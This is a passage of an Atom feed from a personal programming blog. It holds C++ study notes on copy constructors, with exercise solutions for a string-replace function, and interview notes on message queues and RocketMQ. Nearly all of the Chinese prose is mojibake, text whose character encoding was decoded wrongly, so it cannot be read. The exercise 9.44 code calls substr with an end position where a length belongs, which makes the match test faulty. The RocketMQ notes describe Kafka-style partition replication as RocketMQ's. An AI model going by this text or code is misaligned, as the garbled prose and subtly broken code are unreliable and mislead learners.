å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è‡ªèº«ç±»ç±»å‹çš„å¼•ç”¨ï¼Œä¸”ä»»ä½•é¢å¤–å‚æ•°éƒ½æœ‰é»˜è®¤å€¼ï¼Œåˆ™æ­¤æ„é€ å‡½æ•°æ˜¯æ‹·è´æ„é€ å‡½æ•°ã€‚å½“ä½¿ç”¨<strong>æ‹·è´åˆå§‹åŒ–</strong>æ—¶ï¼Œæˆ‘ä»¬ä¼šç”¨åˆ°æ‹·è´æ„é€ å‡½æ•°ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Foo</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Foo</span>(); <span class="comment">//é»˜è®¤æ„é€ å‡½æ•°</span></span><br><span class="line">    <span class="built_in">Foo</span>(<span class="type">const</span> Foo&amp;);<span class="comment">//æ‹·è´æ„é€ å‡½æ•°</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ‹·è´å‡½æ•°é€šå¸¸ä¸åº”è¯¥æ˜¯explicitçš„</strong></p><h2><span id="æ‹·è´åˆå§‹åŒ–">æ‹·è´åˆå§‹åŒ–</span></h2><ul><li><p>ç”¨&#x3D;å®šä¹‰å˜é‡</p></li><li><p>å°†ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå®å‚ä¼ é€’ç»™ä¸€ä¸ªéå¼•ç”¨ç±»å‹çš„å½¢å‚</p></li><li><p>ä»èŠ±æ‹¬å·åˆ—è¡¨åˆå§‹åŒ–ä¸€ä¸ªæ•°ç»„ä¸­çš„å…ƒç´ æˆ–ä¸€ä¸ªèšåˆç±»ä¸­çš„æˆå‘˜</p></li></ul><h2><span id="é‡è½½æ‹·è´èµ‹å€¼è¿ç®—ç¬¦">é‡è½½æ‹·è´èµ‹å€¼è¿ç®—ç¬¦</span></h2><p>å¦‚æœä¸€ä¸ªç±»æœªå®šä¹‰è‡ªå·±çš„æ‹·è´èµ‹å€¼è¿ç®—ç¬¦ï¼Œç¼–è¯‘å™¨ä¼šä¸ºå®ƒç”Ÿæˆä¸€ä¸ªåˆæˆæ‹·è´èµ‹å€¼è¿ç®—ç¬¦</p><p>å¦‚æœä¸€ä¸ªè¿ç®—ç¬¦æ˜¯ä¸€ä¸ªæˆå‘˜å‡½æ•°ï¼Œå…¶å·¦ä¾§è¿ç®—å¯¹è±¡å°±ç»‘å®šåˆ°éšå¼çš„thiså‚æ•°ã€‚èµ‹å€¼è¿ç®—ç¬¦é€šå¸¸è¿”å›ä¸€ä¸ªæŒ‡å‘å…¶å·¦ä¾§è¿ç®—å¯¹è±¡çš„å¼•ç”¨ã€‚</p><h1><span id="ç»ƒä¹ ">ç»ƒä¹ </span></h1><h2><span id="943">9.43</span></h2><p>å¦‚æœä½¿ç”¨!&#x3D;æ¥æ¯”è¾ƒä¸¤ä¸ªè¿­ä»£å™¨åœ¨è¿™é¢˜æ˜¯ä¸è¡Œçš„ï¼Œä½†æ˜¯å¦‚æœä¸æ˜¯ç‰¹æ®Šæ¡ä»¶æœ€å¥½å†™æˆï¼&#x3D;çš„åˆ¤æ–­æ¡ä»¶ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">replace</span><span class="params">(string&amp; s, <span class="type">const</span> string&amp; oldVal, <span class="type">const</span> string&amp; newVal)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">auto</span> curr = s.<span class="built_in">begin</span>();</span><br><span class="line"><span class="keyword">while</span> (curr &lt;= s.<span class="built_in">end</span>() - oldVal.<span class="built_in">size</span>())</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (oldVal == s.<span class="built_in">substr</span>(curr-<span class="built_in">begin</span>(s),  oldVal.<span class="built_in">size</span>()))</span><br><span class="line">&#123;</span><br><span class="line">curr = s.<span class="built_in">erase</span>(curr, curr + oldVal.<span class="built_in">size</span>());</span><br><span class="line">curr = s.<span class="built_in">insert</span>(curr, newVal.<span class="built_in">begin</span>(), newVal.<span class="built_in">end</span>());</span><br><span class="line">curr += newVal.<span class="built_in">size</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">++curr;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    string s = <span class="string">&quot;tho &quot;</span>;</span><br><span class="line">    string oldVal = <span class="string">&quot;tho&quot;</span>;</span><br><span class="line">    string newVal = <span class="string">&quot;though&quot;</span>;</span><br><span class="line"><span class="built_in">replace</span>(s, oldVal, newVal);</span><br><span class="line">    cout &lt;&lt; s;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="944">9.44</span></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">replace</span><span class="params">(string&amp; s, <span class="type">const</span> string&amp; o, <span class="type">const</span> string&amp; n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">size_t</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i+o.<span class="built_in">size</span>() &lt;= s.<span class="built_in">size</span>()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (o == s.<span class="built_in">substr</span>(i,i+o.<span class="built_in">size</span>())) &#123;</span><br><span class="line">            s.<span class="built_in">replace</span>(i, o.<span class="built_in">size</span>(), n);</span><br><span class="line">            i += n.<span class="built_in">size</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    string s = <span class="string">&quot;tho &quot;</span>;</span><br><span class="line">    string oldVal = <span class="string">&quot;tho&quot;</span>;</span><br><span class="line">    string newVal = <span class="string">&quot;though&quot;</span>;</span><br><span class="line"><span class="built_in">replace</span>(s, oldVal, newVal);</span><br><span class="line">    cout &lt;&lt; s;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;æ€»ç»“ä¸€äº›C++å­¦ä¹ ä¸­ç–‘æƒ‘çš„ç‚¹&lt;/p&gt;</summary>
    
    
    
    <category term="log" scheme="https://disda-coding.github.io/categories/log/"/>
    
    
    <category term="C++" scheme="https://disda-coding.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>ä¸­é—´ä»¶</title>
    <link href="https://disda-coding.github.io/2020/04/16/middleWare/"/>
    <id>https://disda-coding.github.io/2020/04/16/middleWare/</id>
    <published>2020-04-16T09:22:02.000Z</published>
    <updated>2020-04-16T10:20:38.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>é€‚ç”¨äºé¢è¯•å›ç­”</p><span id="more"></span><!-- toc --><ul><li><a href="#redis">Redis</a></li><li><a href="#mq">MQ</a><ul><li><a href="#%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E4%BC%98%E7%BC%BA%E7%82%B9">æ¶ˆæ¯é˜Ÿåˆ—ä¼˜ç¼ºç‚¹</a></li><li><a href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8rocketmq">ä¸ºä»€ä¹ˆç”¨RocketMQ</a></li><li><a href="#rocketmq%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AF%81%E9%AB%98%E5%8F%AF%E7%94%A8%E6%80%A7">RocketMQå¦‚ä½•ä¿è¯é«˜å¯ç”¨æ€§</a></li><li><a href="#rocketmq%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AF%81%E6%B6%88%E6%81%AF%E4%B8%8D%E8%A2%AB%E9%87%8D%E5%A4%8D%E6%B6%88%E8%B4%B9">RocketMQå¦‚ä½•ä¿è¯æ¶ˆæ¯ä¸è¢«é‡å¤æ¶ˆè´¹</a></li><li><a href="#%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AF%81%E6%B6%88%E6%81%AF%E5%8F%AF%E9%9D%A0%E6%80%A7">å¦‚ä½•ä¿è¯æ¶ˆæ¯å¯é æ€§</a></li></ul></li></ul><!-- tocstop --><h1><span id="redis">Redis</span></h1><h1><span id="mq">MQ</span></h1><h2><span id="æ¶ˆæ¯é˜Ÿåˆ—ä¼˜ç¼ºç‚¹">æ¶ˆæ¯é˜Ÿåˆ—ä¼˜ç¼ºç‚¹</span></h2><p><strong>ä¼˜ç‚¹</strong></p><p>â€‹è§£è€¦ã€å‰Šå³°å’Œå¼‚æ­¥</p><p><strong>ç¼ºç‚¹</strong></p><p>â€‹æå‡äº†ç³»ç»Ÿçš„å¤æ‚åº¦ã€ç³»ç»Ÿå¯ç”¨æ€§é™ä½ä»¥åŠå­˜åœ¨ä¸€è‡´æ€§çš„é—®é¢˜ã€‚</p><h2><span id="ä¸ºä»€ä¹ˆç”¨rocketmq">ä¸ºä»€ä¹ˆç”¨RocketMQ</span></h2><ul><li>ååé‡ï¼šActiveMQå’ŒRabbitMQæ˜¯ä¸‡çº§ï¼Œè€ŒRocketMQå’ŒKafkaæ˜¯åä¸‡çº§ã€‚</li><li>Topicï¼š RocketMQå¯ä»¥æ”¯æŒæˆç™¾ä¸Šåƒï¼Œè€ŒKafkaå‡ åå‡ ç™¾ååé‡å¤§å¹…ä¸‹é™</li><li>æ—¶æ•ˆæ€§ï¼š é™¤äº†Rabbitéƒ½æ˜¯msçº§åˆ«</li><li>å¯ç”¨æ€§ï¼šRocketMQå’ŒKafkaéƒ½éå¸¸é«˜</li><li>å¯é æ€§ï¼šRockMQå’ŒKafkaå¯ä»¥åšåˆ°ä¸ä¸¢</li></ul><h2><span id="rocketmqå¦‚ä½•ä¿è¯é«˜å¯ç”¨æ€§">RocketMQå¦‚ä½•ä¿è¯é«˜å¯ç”¨æ€§</span></h2><p>ä¸€ä¸ªæœ€åŸºæœ¬çš„æ¶æ„è®¤è¯†ï¼šç”±å¤šä¸ª broker ç»„æˆï¼Œæ¯ä¸ª broker æ˜¯ä¸€ä¸ªèŠ‚ç‚¹ï¼›ä½ åˆ›å»ºä¸€ä¸ª topicï¼Œè¿™ä¸ª topic å¯ä»¥åˆ’åˆ†ä¸ºå¤šä¸ª partitionï¼Œæ¯ä¸ª partition å¯ä»¥å­˜åœ¨äºä¸åŒçš„ broker ä¸Šï¼Œæ¯ä¸ª partition å°±æ”¾ä¸€éƒ¨åˆ†æ•°æ®ã€‚</p><p>å‰¯æœ¬æœºåˆ¶ï¼Œæ¯ä¸ª partition çš„æ•°æ®éƒ½ä¼šåŒæ­¥åˆ°å…¶å®ƒæœºå™¨ä¸Šï¼Œå½¢æˆè‡ªå·±çš„å¤šä¸ª replica å‰¯æœ¬ã€‚æ‰€æœ‰å‰¯æœ¬ä¼šé€‰å–ä¸€ä¸ªleaderç”¨æ¥è¯»å†™æ•°æ®ã€‚å¦‚æœleader downäº†ï¼Œå°±é‡æ–°é€‰æ‹©leaderã€‚</p><p><strong>å†™æ•°æ®</strong>çš„æ—¶å€™ï¼Œç”Ÿäº§è€…å°±å†™ leaderï¼Œç„¶å leader å°†æ•°æ®è½åœ°å†™æœ¬åœ°ç£ç›˜ï¼Œæ¥ç€å…¶ä»– follower è‡ªå·±ä¸»åŠ¨ä» leader æ¥ pull æ•°æ®ã€‚ä¸€æ—¦æ‰€æœ‰ follower åŒæ­¥å¥½æ•°æ®äº†ï¼Œå°±ä¼šå‘é€ ack ç»™ leaderï¼Œleader æ”¶åˆ°æ‰€æœ‰ follower çš„ ack ä¹‹åï¼Œå°±ä¼šè¿”å›å†™æˆåŠŸçš„æ¶ˆæ¯ç»™ç”Ÿäº§è€…ã€‚</p><h2><span id="rocketmqå¦‚ä½•ä¿è¯æ¶ˆæ¯ä¸è¢«é‡å¤æ¶ˆè´¹">RocketMQå¦‚ä½•ä¿è¯æ¶ˆæ¯ä¸è¢«é‡å¤æ¶ˆè´¹</span></h2><p>æ¯ä¸ªæ¶ˆæ¯å†™è¿›å»ï¼Œéƒ½æœ‰ä¸€ä¸ª offsetï¼Œä»£è¡¨æ¶ˆæ¯çš„åºå·ï¼Œç„¶å æ¶ˆè´¹è€…æ¶ˆè´¹äº†æ•°æ®ä¹‹åï¼Œ<strong>æ¯éš”ä¸€æ®µæ—¶é—´</strong>å°±ä¼šæäº¤ offset ã€‚</p><p>å¦‚æœé‡å¯æ€ä¹ˆåŠï¼Ÿ</p><ul><li>æ¯”å¦‚ä½ æ‹¿ä¸ªæ•°æ®è¦å†™åº“ï¼Œä½ å…ˆæ ¹æ®ä¸»é”®æŸ¥ä¸€ä¸‹ï¼Œå¦‚æœè¿™æ•°æ®éƒ½æœ‰äº†ï¼Œä½ å°±åˆ«æ’å…¥äº†ï¼Œupdate ä¸€ä¸‹å¥½å§ã€‚</li><li>æ¯”å¦‚ä½ æ˜¯å†™ Redisï¼Œé‚£æ²¡é—®é¢˜äº†ï¼Œåæ­£æ¯æ¬¡éƒ½æ˜¯ setï¼Œå¤©ç„¶å¹‚ç­‰æ€§ã€‚</li><li>æ¯”å¦‚ä½ ä¸æ˜¯ä¸Šé¢ä¸¤ä¸ªåœºæ™¯ï¼Œé‚£åšçš„ç¨å¾®å¤æ‚ä¸€ç‚¹ï¼Œä½ éœ€è¦è®©ç”Ÿäº§è€…å‘é€æ¯æ¡æ•°æ®çš„æ—¶å€™ï¼Œé‡Œé¢åŠ ä¸€ä¸ªå…¨å±€å”¯ä¸€çš„ idï¼Œæ¶ˆè´¹åˆ°äº†ä¹‹åï¼Œå…ˆæ ¹æ®è¿™ä¸ª id å»æ¯”å¦‚ Redis é‡ŒæŸ¥ä¸€ä¸‹ï¼Œä¹‹å‰æ¶ˆè´¹è¿‡å—ï¼Ÿå¦‚æœæ²¡æœ‰æ¶ˆè´¹è¿‡ï¼Œä½ å°±å¤„ç†ï¼Œç„¶åè¿™ä¸ª id å†™ Redisã€‚å¦‚æœæ¶ˆè´¹è¿‡äº†ï¼Œé‚£ä½ å°±åˆ«å¤„ç†äº†ï¼Œä¿è¯åˆ«é‡å¤å¤„ç†ç›¸åŒçš„æ¶ˆæ¯å³å¯ã€‚</li><li>æ¯”å¦‚åŸºäºæ•°æ®åº“çš„å”¯ä¸€é”®æ¥ä¿è¯é‡å¤æ•°æ®ä¸ä¼šé‡å¤æ’å…¥å¤šæ¡ã€‚å› ä¸ºæœ‰å”¯ä¸€é”®çº¦æŸäº†ï¼Œé‡å¤æ•°æ®æ’å…¥åªä¼šæŠ¥é”™ï¼Œä¸ä¼šå¯¼è‡´æ•°æ®åº“ä¸­å‡ºç°è„æ•°æ®ã€‚</li></ul><h2><span id="å¦‚ä½•ä¿è¯æ¶ˆæ¯å¯é æ€§">å¦‚ä½•ä¿è¯æ¶ˆæ¯å¯é æ€§</span></h2>]]></content>
    
    
    <summary type="html">&lt;p&gt;é€‚ç”¨äºé¢è¯•å›ç­”&lt;/p&gt;</summary>
    
    
    
    <category term="é¢è¯•" scheme="https://disda-coding.github.io/categories/%E9%9D%A2%E8%AF%95/"/>
    
    
    <category term="ä¸­é—´ä»¶" scheme="https://disda-coding.github.io/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/"/>
    
  </entry>
  
</feed>
